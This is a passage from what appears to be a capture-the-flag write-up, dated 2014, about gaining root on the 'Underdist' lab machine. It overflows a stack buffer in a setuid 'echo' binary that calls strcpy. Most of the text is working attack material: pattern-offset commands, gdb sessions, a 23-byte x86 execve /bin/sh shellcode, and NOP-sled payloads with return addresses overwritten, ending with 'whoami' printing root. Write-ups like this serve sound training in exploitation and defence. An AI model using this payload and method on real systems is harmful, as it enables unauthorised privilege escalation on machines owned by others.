Starting program: /home/underdist/.bin/echo $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B'")
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B

Program received signal SIGSEGV, Segmentation fault.
0x6b41316b in ?? ()
```

so the crash at address 0x6b41316b

lets see what offset we are at

```bash
root@n1x:~# ruby /usr/share/metasploit-framework/tools/pattern_offset.rb 0x6b41316b 1024
[*] Exact match at offset 304
```

```
(gdb) r $(python -c "print 'A' * 1024") 
(gdb) x/2000s $esp
```

 

so lets prepare the payload and kill the root

304 (NOP + SHELLC0D3 ) + 4 BIT For EIP and we will be done

here is x86 shell code to execute /bin/sh shellcode size 23bit tiny one

```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

so 304 buffer  - 23 shell code=  281 nop

so lets redo it and put a break point on strcpy

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804844c <+0>:	push   %ebp
   0x0804844d <+1>:	mov    %esp,%ebp
   0x0804844f <+3>:	sub    $0x134,%esp
   0x08048455 <+9>:	mov    0xc(%ebp),%eax
   0x08048458 <+12>:	add    $0x4,%eax
   0x0804845b <+15>:	mov    (%eax),%eax
   0x0804845d <+17>:	mov    %eax,0x4(%esp)
   0x08048461 <+21>:	lea    -0x12c(%ebp),%eax
   0x08048467 <+27>:	mov    %eax,(%esp)
   0x0804846a <+30>:	call   0x8048320 <strcpy@plt>
   0x0804846f <+35>:	lea    -0x12c(%ebp),%eax
   0x08048475 <+41>:	mov    %eax,(%esp)
   0x08048478 <+44>:	call   0x8048330 <puts@plt>
   0x0804847d <+49>:	mov    $0x0,%eax
   0x08048482 <+54>:	leave
   0x08048483 <+55>:	ret
End of assembler dump.
(gdb) break *0x0804846a
Breakpoint 1 at 0x804846a
(gdb) r $(python -c "print 'A' * 304")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/underdist/.bin/echo $(python -c "print 'A' * 304")

Breakpoint 1, 0x0804846a in main ()
(gdb) x/400s $esp
```

 

printing data inside esp register

```
0xbffff7f9:	 'A' <repeats 200 times>...
0xbffff8c1:	 'A' <repeats 104 times>
```

 

```
(gdb) r $(python -c "print '\x90' * 281 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\xf9\xf7\xff\xbf'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/underdist/.bin/echo $(python -c "print '\x90' * 281 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\xf9\xf7\xff\xbf'")

Breakpoint 1, 0x0804846a in main ()
(gdb) c
Continuing.
                                                                                                                                                                                                                                                                                         1 Ph//shh/bin  PS  
                                                                                                      ̀    
process 4724 is executing new program: /bin/dash
$
```

welcome love :D

but we still in the gdb so we have to run it outside the gdb

after i run it from a shell it says Violación de segmento

so lets do it again inside gdb

```
(gdb) r $(python -c "print '\x90' * 285 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
Starting program: /home/underdist/.bin/echo $(python -c "print '\x90' * 285 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
                                                                                                                                                                                                                                                                                             1 Ph//shh/bin  PS  
                                                                                                          ̀

Program received signal SIGSEGV, Segmentation fault.
0x80cd0bb0 in ?? ()
```

lets check the esp one more

```
0xbffff7f5:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffff8bd:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v\315\200"
```

 

NOPS everywhere

so lets  do it from gdb  again

```bash
(gdb) r $(python -c "print '\x90' * 281 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+ '\xf5\xf7\xff\xbf'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/underdist/.bin/echo $(python -c "print '\x90' * 281 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+ '\xf5\xf7\xff\xbf'")
                                                                                                                                                                                                                                                                                         1 Ph//shh/bin  PS  
                                                                                                      ̀    
process 5473 is executing new program: /bin/dash
$ exit
[Inferior 1 (process 5473) exited normally]
(gdb) quit
Tiene correo nuevo en /var/mail/underdist
underdist@Underdist:~/.bin$ ./echo $(python -c "print '\x90' * 281 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+ '\xf5\xf7\xff\xbf'")
                                                                                                                                                                                                                                                                                         1 Ph//shh/bin  PS  
                                                                                                      ̀    
Violación de segmento
underdist@Underdist:~/.bin$ ./echo $(python -c "print '\x90' * 281 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+ '\xbd\xf8\xff\xbf'")
                                                                                                                                                                                                                                                                                         1 Ph//shh/bin  PS  
                                                                                                      ̀    
# whoami
root
```

first time i run it from shell it lead to invalid address but as we have 281 NOP so i decided to use the next NOP address

and hell yeaah

![Screen Shot 2014-12-03 at 10.22.07 AM 1](/uploads/2014/12/Screen-Shot-2014-12-03-at-10.22.07-AM-1.png)
